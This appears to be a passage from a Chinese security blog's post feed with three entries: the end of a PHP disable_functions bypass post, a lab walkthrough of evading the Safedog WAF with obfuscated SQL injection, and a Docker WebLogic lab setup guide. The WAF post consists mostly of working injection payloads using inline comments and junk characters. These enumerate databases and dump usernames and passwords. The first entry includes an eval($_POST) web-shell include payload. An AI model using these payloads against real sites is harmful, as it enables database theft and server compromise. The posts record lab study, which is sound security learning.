an></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/009180228698.png" alt="img"></p><p>然后通过首页的命令去包含这个</p><pre><code>a=eval($_POST[1]);&amp;1=include("/var/tmp/exp.php");</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/009180522474.png" alt="img"></p><p>蚁剑的这个插件也可以绕过</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/009175741321.png" alt="img"></p><p>直接读取命令乱码</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/009180101028.png" alt="img"></p><p>还是老老实实用exp</p><h3 id="利用iconv"><a href="#利用iconv" class="headerlink" title="利用iconv"></a>利用iconv</h3><h4 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h4><ul><li>Linux 操作系统</li><li><code>putenv</code></li><li><code>iconv</code></li><li>存在可写的目录, 需要上传 <code>.so</code> 文件</li></ul><p>原理分析<a href="https://hugeh0ge.github.io/2019/11/04/Getting-Arbitrary-Code-Execution-from-fopen-s-2nd-Argument/" target="_blank" rel="noopener">https://hugeh0ge.github.io/2019/11/04/Getting-Arbitrary-Code-Execution-from-fopen-s-2nd-Argument/</a></p><h4 id="攻击-1"><a href="#攻击-1" class="headerlink" title="攻击"></a>攻击</h4><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211009230234108.png" alt="image-20211009230234108"></p><p>然后使用蚁剑的插件</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211009230304882.png" alt="image-20211009230304882"></p><p>然后会生成一个文件</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211009230340108.png" alt="image-20211009230340108"></p><p>然后跟php-fpm一样创建一个副本</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211009230432238.png" alt="image-20211009230432238"></p><p>打开终端</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211009230444316.png" alt="image-20211009230444316"></p><p>成功执行命令</p><p>参考链接：</p><p>[<a href="https://whoamianony.top/2021/03/13/Web%E5%AE%89%E5%85%A8/Bypass%20Disable_functions/]" target="_blank" rel="noopener">https://whoamianony.top/2021/03/13/Web%E5%AE%89%E5%85%A8/Bypass%20Disable_functions/]</a>(<a href="https://whoamianony.top/2021/03/13/Web安全/Bypass" target="_blank" rel="noopener">https://whoamianony.top/2021/03/13/Web安全/Bypass</a> Disable_functions/)</p><p><a href="https://xz.aliyun.com/t/10057#toc-10" target="_blank" rel="noopener">https://xz.aliyun.com/t/10057#toc-10</a></p><p><a href="https://www.mi1k7ea.com/2019/06/02/浅谈几种Bypass-disable-functions的方法/" target="_blank" rel="noopener">https://www.mi1k7ea.com/2019/06/02/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-disable-functions%E7%9A%84%E6%96%B9%E6%B3%95/</a></p><p><a href="https://www.geekby.site/2021/08/常见bypass-disable-functions方法/" target="_blank" rel="noopener">https://www.geekby.site/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/</a></p><p><a href="https://zgao.top/利用ld_preload实现函数劫持以及用法总结/" target="_blank" rel="noopener">https://zgao.top/%E5%88%A9%E7%94%A8ld_preload%E5%AE%9E%E7%8E%B0%E5%87%BD%E6%95%B0%E5%8A%AB%E6%8C%81%E4%BB%A5%E5%8F%8A%E7%94%A8%E6%B3%95%E6%80%BB%E7%BB%93/</a></p><p><a href="https://www.freebuf.com/column/216669.html" target="_blank" rel="noopener">https://www.freebuf.com/column/216669.html</a></p><p><a href="https://www.tr0y.wang/2018/04/18/PHPDisalbedfunc/index.html#LD-PRELOAD" target="_blank" rel="noopener">https://www.tr0y.wang/2018/04/18/PHPDisalbedfunc/index.html#LD-PRELOAD</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入绕过安全狗</title>
      <link href="/posts/fdcd.html"/>
      <url>/posts/fdcd.html</url>
      
        <content type="html"><![CDATA[<p>前言：之前看过了，一直没动手，不是个好习惯，要多动手多思考多钻研</p><h1 id="sql注入之安全狗绕过"><a href="#sql注入之安全狗绕过" class="headerlink" title="sql注入之安全狗绕过"></a>sql注入之安全狗绕过</h1><p>官网下载的安全狗版本还是0.30255，这个绕过方式5月份就有了。</p><h3 id="0x1环境准备"><a href="#0x1环境准备" class="headerlink" title="0x1环境准备"></a>0x1环境准备</h3><p>win7  </p><p>WAF：安全狗4.0  0.30255</p><p>phpstudy2017</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/%E5%AE%89%E5%85%A8%E7%8B%97.png" alt="安全狗"></p><h3 id="0x2基础知识理解"><a href="#0x2基础知识理解" class="headerlink" title="0x2基础知识理解"></a>0x2基础知识理解</h3><p>1.一般绕过安全狗很多都是注释符号去绕过，然而但是/**/最简单的方式是不行，但是可以在里面加一些垃圾字符可以绕过，也是需要去FUZZ测试，因为安全狗也会对里面的内容做了过滤</p><p>2.内联注释 /<em>!</em>/，在mysql里面内联注释有一个特性，如果里面的内容超出了当前的mysql版本就会报错，没有超出就不会报错</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211002174138478.png" alt="image-20211002174138478"></p><ul><li>/<em>!select</em>/: 直接会之执行里面的函数</li><li>/<em>!12345select</em>/: 当12345小于当前mysql版本号的时候，注释不生效，当大于版本号的时候注释生效。</li><li>/<em>![]</em>/: []中括号中的数字若填写则必须是5位 </li></ul><p>3.mysql还有一个原理：</p><p>正常情况</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211002174156566.png" alt="image-20211002174156566"></p><p>加几个空格，发现也是可以的</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211002174240358.png" alt="image-20211002174240358"></p><p>那么在括号里面添加空格</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211002174311955.png" alt="image-20211002174311955"></p><p>加个注释符号也是可以绕过的</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211002174352832.png" alt="image-20211002174352832"></p><h3 id="0x3开始FUZZ测试"><a href="#0x3开始FUZZ测试" class="headerlink" title="0x3开始FUZZ测试"></a>0x3开始FUZZ测试</h3><p>FUZZ一波，看看那些被过滤，哪些没有过滤(实战的时候还是不要去跑fuzz脚本了)</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211002174508632.png" alt="image-20211002174508632"></p><p>因为他服务器那边都能看到你的记录的，直接给你封了ip</p><pre class="line-numbers language-bash"><code class="language-bash">1<span class="token string">' and 1 拦截1'</span> and <span class="token string">'1 拦截1'</span> and a 绕过  //测试了好几个，里面不管是单个字母还是多个字母都绕过了1<span class="token string">' and '</span>a<span class="token string">' 拦截 1'</span> and hex<span class="token punctuation">(</span>1<span class="token punctuation">)</span> 拦截1' and ord<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">)</span> 不拦截<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>and不拦截 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="1-判断是否存在sql注入"><a href="#1-判断是否存在sql注入" class="headerlink" title="1.判断是否存在sql注入"></a>1.判断是否存在sql注入</h4><p>因为在真实环境中需要去检验是否存在sql注入，才有后续的步骤。</p><pre class="line-numbers language-bash"><code class="language-bash">?id<span class="token operator">=</span>1<span class="token string">' and ord("a")-96 --+?id=1'</span> and ord<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">)</span>-97 --+   //这两个payload就相当于and 1<span class="token operator">=</span>1  and 1<span class="token operator">=</span>2 去检查是否存在sql注入<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211002174814207.png" alt="image-20211002174814207"></p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211002174829065.png" alt="image-20211002174829065"></p><h4 id="2-fuzz哪些函数能绕过"><a href="#2-fuzz哪些函数能绕过" class="headerlink" title="2.fuzz哪些函数能绕过"></a>2.fuzz哪些函数能绕过</h4><pre class="line-numbers language-bash"><code class="language-bash">测试过程就不放截图了order 不拦截order by 拦截 union 不拦截union <span class="token keyword">select</span> 拦截order%20by 拦截order%20%0aby 拦截order/*by*/没有被拦截 ，思路打开尝试注释去绕过了order/**/by 拦截  那么直接往里面添加一些垃圾字符绕过<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3-打开burp-fuzz垃圾字符"><a href="#3-打开burp-fuzz垃圾字符" class="headerlink" title="3.打开burp fuzz垃圾字符"></a>3.打开burp fuzz垃圾字符</h4><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211002174927425.png" alt="image-20211002174927425"></p><p>爆破</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211002175022519.png" alt="image-20211002175022519"></p><p>可以看到还是有很多垃圾字符可以绕过</p><pre class="line-numbers language-bash"><code class="language-bash">/*/%-//*/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在尝试order by,绕过了</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211002175105435.png" alt="image-20211002175105435"></p><h4 id="4-union-select"><a href="#4-union-select" class="headerlink" title="4.union select"></a>4.union select</h4><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211002175132953.png" alt="image-20211002175132953"></p><p>union这种就在绕不过了，不过在apache3.5版本这个方法可以绕过</p><p>测试一下哪些可以绕过</p><pre class="line-numbers language-bash"><code class="language-bash">-1<span class="token string">'  union /*/%-//*/ /*!select*/ 1,2,3 --+  拦截-1'</span>  union /*/%-//*/ /*<span class="token operator">!</span>12345select*/ 1,2,3 --+ 拦截-1<span class="token string">'  union /*/%-//*/ /*!12345%23%0aselect*/ 1,2,3 --+  不拦截-1'</span>  union /*<span class="token operator">!</span>12345%23%0aselect*/ 1,2,3 --+ 拦截<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这里看看这个语句/<em>!12345%23%0aselect</em>/  </p><p>%23就是#   %0a换行  </p><p>总的意思就是在12345后面加了一个注释符号，当然注释符号后面就会被注释，但是这时候出现了%0a 换了一行，后面的还是正常执行</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211002175305155.png" alt="image-20211002175305155"></p><h4 id="5-查询数据库"><a href="#5-查询数据库" class="headerlink" title="5.查询数据库"></a>5.查询数据库</h4><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211002184648064.png" alt="image-20211002184648064"></p><p>database()被过滤了</p><p>尝试在database/<em>/%-//</em>/ ( )</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211002184710516.png" alt="image-20211002184710516"></p><p>绕过了</p><p>除了上面，拓展一个方式</p><p>mysql里面的一个原理：对于正常的闭合都是有头有尾的,但是mysq里面的内联注释可以不用</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211002184741131.png" alt="image-20211002184741131"></p><pre><code>就拿这个来说，正常都是( ( ) ),但是这个是( ( )还是可以正常执行的</code></pre><h4 id="6-查询其他库名"><a href="#6-查询其他库名" class="headerlink" title="6.查询其他库名"></a>6.查询其他库名</h4><pre><code>-1'  union /*/%-//*/ /*!12345%23%0aselect*/ 1,2,group_concat(schema_name) from information_schema.schemata --+</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211002184912204.png" alt="image-20211002184912204"></p><pre><code>-1'  union /*/%-//*/ /*!12345%23%0aselect*/ 1,2,group_concat(schema_name)/*/%-//*/from/*/%-//*/information_schema.schemata --+  </code></pre><p>还是被拦截了</p><p>单独来测试函数 </p><pre class="line-numbers language-bash"><code class="language-bash">from 未拦截information未拦截information_schema 拦截information_schema.schemata 拦截from/*/%-//*/information_schema.schemata 拦截from information 未拦截from/*/%-//*/information_schema./*/%-//*/schemata 拦截<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>来试试3.5版本的</p><pre><code>/*!00000%23%0afrom*//*!00000%23%0afrom*//*/%-//*/information/*/%-//*/_schema.schemata 拦截/*!12345%23%0afrom*//*/%-//*/information_schema./*/%-//*/schemata 拦截既然不行再对information_schema.schemata试试/*!12345%23%0afrom*/ /*!information_schema.schema*/-1'  union /*/%-//*/ /*!12345%23%0aselect/*!1,2,*/ group_concat(schema_name) /*!12345%23%0afrom*/  /*!00000%23%0ainformation_schema./*!schemata*/ 拦截-1'  union /*/%-//*/ /*!12345%23%0aselect/*!1,2,*/ group_concat(schema_name) /*!from*/  /*!12345%23%0ainformation_schema./*!schemata*/ 拦截-1'  union /*/%-//*/ /*!12345%23%0aselect/*!1,2,*/ group_concat(schema_name) /*!from*/  /*!%23/*%0ainformation_schema./*!schemata*/ 拦截感觉这里对information_schema.schemata %23这里不管用了，那么就用--+-1'  union /*/%-//*/ /*!12345%23%0aselect/*!1,2,*/ group_concat(schema_name) /*!from*/  /*!12345--+%0ainformation_schema./*!schemata*/ 拦截-1'  union /*/%-//*/ /*!12345%23%0aselect/*!1,2,*/ group_concat(schema_name) /*!from*/  /*!--+/*%0ainformation_schema./*!schemata*/ 不拦截</code></pre><p>fuzz跑了一边就这个可以绕过,在前面还可以认%0a，这里information就不认了，举个例子：/!–+/<em>%0axxx</em>/</p><p>还得再加一个/<em>跟后面闭合成了注释/</em>%0axxxxx<em>/,但恰巧–+把/</em>注释了  就成了后面的xxx*/</p><p>最后就成了/<em>!xxx</em>/</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211002185450014.png" alt="image-20211002185450014"></p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211002185508516.png" alt="image-20211002185508516"></p><h4 id="7-查其他表名"><a href="#7-查其他表名" class="headerlink" title="7.查其他表名"></a>7.查其他表名</h4><pre><code>-1' union /*/%-//*/ /*!12345%23%0aselect/*!1,2,*/ group_concat(table_name) /*!from*/  /*!--+/*%0ainformation_schema./*!tables*/ where table_schema='security'--+</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211002185547169.png" alt="image-20211002185547169"></p><h4 id="8-查其他列名"><a href="#8-查其他列名" class="headerlink" title="8.查其他列名"></a>8.查其他列名</h4><pre><code>-1' union /*/%-//*/ /*!12345%23%0aselect/*!1,2,*/ group_concat(column_name) /*!from*/  /*!--+/*%0ainformation_schema./*!columns*/ where table_name='users'--+</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211002185617828.png" alt="image-20211002185617828"></p><h4 id="9-查数据"><a href="#9-查数据" class="headerlink" title="9.查数据"></a>9.查数据</h4><pre><code>-1' union /*/%-//*/ /*!12345%23%0aselect/*!1,2,*/ group_concat(concat_ws(0x7e,username,password)) /*!from*/  users --+-1' union /*/%-//*/ /*!12345%23%0aselect/*!1,2,*/ group_concat(concat_ws(0x7e,username,password)) /*!from*/  security.users --+</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211002185644382.png" alt="image-20211002185644382"></p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/%E5%A5%A5%E5%8A%9B%E7%BB%99.jpg" alt="奥力给"></p><p>参考链接</p><p><a href="https://mp.weixin.qq.com/s/AyZh3RdgZ-nWzlgdnQXJzg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/AyZh3RdgZ-nWzlgdnQXJzg</a></p><p><a href="https://mp.weixin.qq.com/s/kpSMDm4qrV6ZvdJ1k_0q0A" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/kpSMDm4qrV6ZvdJ1k_0q0A</a></p><p><a href="https://www.cnblogs.com/Cl0ud/default.html?page=1" target="_blank" rel="noopener">https://www.cnblogs.com/Cl0ud/default.html?page=1</a></p>]]></content>
      
      
      <categories>
          
          <category> WAF绕过 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WAF绕过 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker创建weblogic的方式</title>
      <link href="/posts/ff3e.html"/>
      <url>/posts/ff3e.html</url>
      
        <content type="html"><![CDATA[<p>前言：较为详细的一次搭建weblogic的方式，因为vulhub上面的weblogic环境生成的tar包传不上去，才有了这用dockerfile创建的环境</p><h1 id="Docker-Weblogic-10-3-6"><a href="#Docker-Weblogic-10-3-6" class="headerlink" title="Docker-Weblogic 10.3.6"></a>Docker-Weblogic 10.3.6</h1><ul><li>基础环境准备</li><li>安装weblogic</li><li>生成weblogic基础镜像</li><li>编制 Dockerfile 定制镜像</li></ul><h2 id="基础环境准备"><a href="#基础环境准备" class="headerlink" title="基础环境准备"></a>基础环境准备</h2><p><strong>1. 拉取并保存centos镜像</strong></p><pre><code>$ sudo docker pull centos$ sudo docker save -o centos-7.2.tar centos:latest</code></pre><p><strong>2. 下载jdk rpm包</strong><br><a href="https://www.oracle.com/technetwork/java/javase/downloads/java-archive-downloads-javase7-521261.html#jdk-7u80-oth-JPR" target="_blank" rel="noopener">rpm:jdk-7u80-64bit</a> </p><p><strong>3. 下载weblogic的zip版安装包</strong><br><a href="https://www.oracle.com/technetwork/middleware/weblogic/downloads/wls-for-dev-1703574.html" target="_blank" rel="noopener">ZIP: weblogic-10.3.6-develop-zip</a> </p><p><strong>4. 安装包准备</strong></p><pre><code># 新建文件夹 CVE-Docker$ mkdir CVE-Docker# 将weblogic安装包及jdk安装包拷贝至 CVE-Docker$ cp *.* /home/tim/CVE-Docker# 解压wls1036_dev.zip,解压后的顶层文件目录是wls10360$ sudo unzip wls1036_dev.zip -d wls10360</code></pre><p><strong>5. 导入centos基础镜像</strong></p><pre><code>$ sudo docker load -i centos-7.2.tar</code></pre><h2 id="安装weblogic"><a href="#安装weblogic" class="headerlink" title="安装weblogic"></a>安装weblogic</h2><pre><code># step1 运行基础centos容器,把安装包目录映射到容器的home目录中$ sudo docker run -itd -P -v /home/tim/CVE-Docker:/tmp --name "install_weblogic" centos:latest /bin/bash# step2 进入容器$ sudo docker exec -it install_weblogic /bin/bash# step3 设置root口令[root@d5896162f9fe /]# passwd rootrootroot# step4 创建weblogic用户[root@d5896162f9fe home]# useradd weblogic -p weblogic123# step5 安装jdk[root@d5896162f9fe home]# cd /tmp[root@d5896162f9fe home]# rpm -ivh jdk-7u80-linux-x64.rpm# step6 寻找jdk安装目录，并复制[root@d5896162f9fe jdk1.7.0_80]# find / -name "*jdk*"# step7 设置weblogic安装目录[root@d5896162f9fe jdk1.7.0_80]# mkdir -p /opt/Oracle/weblogic/wls10360# step8 设置环境变量，在profile尾部添加如下配置[root@d5896162f9fe jdk1.7.0_80]# vi /etc/profileexport JAVA_HOME=/usr/java/jdk1.7.0_80export PATH=$JAVA_HOME/bin:$PATHexport CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jarexport MW_HOME=/opt/Oracle/weblogic/wls10360# step9 使环境变量生效[root@d5896162f9fe jdk1.7.0_80]# source /etc/profile# step10  将weblogic安装包文件拷贝至安装目录[root@d5896162f9fe wls10360]# cd /tmp/wls10360[root@d5896162f9fe wls10360]# cp -R ./* /opt/Oracle/weblogic/wls10360/# step11 将weblogic安装目录及文件所有者修改为weblogic用户[root@d5896162f9fe weblogic]# cd /opt[root@d5896162f9fe opt]# chown -R weblogic:weblogic Oracle/# step12 切换至weblogic用户[root@d5896162f9fe wls10360]# su - weblogic# step12 检查当前环境是否符合weblogic安裝要求[weblogic@d5896162f9fe ~]$ cd /opt/Oracle/weblogic/wls10360/[weblogic@d5896162f9fe wls10360]$ ./configure.sh# step13 配置weblogic初始化参数[weblogic@d5896162f9fe wls10360]$ wlserver/server/bin/setWLSEnv.sh#step14 创建weblogic域(domain)[weblogic@d5896162f9fe wls10360]$ wlserver/common/bin/config.sh#step15 选1,创建新域#step16 选1, 选择WebLogic平台组件 #step17 默认回车, Basic WebLogic Server Domain - 10.3.6.0 [wlserver]#step18 默认回车,使用base_domain作为域名#step19 默认鬼扯,使用/opt/Oracle/weblogic/wls10360/user_projects/domains作为域的安装路径#step20 选1,设置登录管理员用户名,设置为weblogic回车#step21 选2,设置登录管理员用户口令,设置为weblogic123回车#step22 选3,确认登录管理员用户口令,输入weblogic123回车#step23 回车进入下一步,选择1,开发环境#step24 选1,选择我们安装的jdk作为java环境#step25 选1,因为我们只安装单节点,所以选1,如果要部署集群则选择2#step26 默认回车,确认weblogic 管理服务信息，回车进行确认# step27 启动weblogic,测试安装成效[weblogic@d5896162f9fe wls10360]$ user_projects/domains/base_domain/startWebLogic.sh#step28 切换到root用户,安装net-tools软件包,查看服务[root@d5896162f9fe /]# yum install net-tools[root@d5896162f9fe /]# netstat -ntlp[root@d5896162f9fe /]# curl http://127.0.0.1:7001/console</code></pre><h2 id="生成weblogic基础镜像"><a href="#生成weblogic基础镜像" class="headerlink" title="生成weblogic基础镜像"></a>生成weblogic基础镜像</h2><p><strong>1. 生成weblogic基础镜像</strong></p><pre><code>$ sudo docker commit install_weblogic weblogic:10.3.6</code></pre><h2 id="编制-Dockerfile-定制镜像"><a href="#编制-Dockerfile-定制镜像" class="headerlink" title="编制 Dockerfile 定制镜像"></a>编制 Dockerfile 定制镜像</h2><p><strong>1. 编制Dockerfile文件</strong></p><pre><code># Version 1.0# base imageFROM weblogic:10.3.6# Author informationsMAINTAINER 779602274@qq.com# 将启动后的目录切换到 /home/weblogic目录WORKDIR  /home/weblogic# Add the locate file to containerADD start.sh /home/weblogic# 使用root用户来执行后续命令USER root# Running some commondsRUN source /etc/profileRUN chown weblogic:weblogic /home/weblogic/start.shRUN chmod +x /home/weblogic/start.sh# 使用weblogic用户来执行后续命令USER weblogic# Expose the port 7001EXPOSE 7001# The commond running after container startedCMD ["/home/weblogic/start.sh"]</code></pre><p><strong>2.编制附加文件start.sh</strong></p><pre><code>#!/bin/bashsource /etc/profile/opt/Oracle/weblogic/wls10360/user_projects/domains/base_domain/startWebLogic.sh</code></pre><p><strong>3.制作最终镜像</strong></p><pre><code>$ sudo docker build -t weblogic:10.3.6 .</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/11.jpg" alt="11"></p>]]></content>
      
      
      <categories>
          
          <category> 环境搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境搭建 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
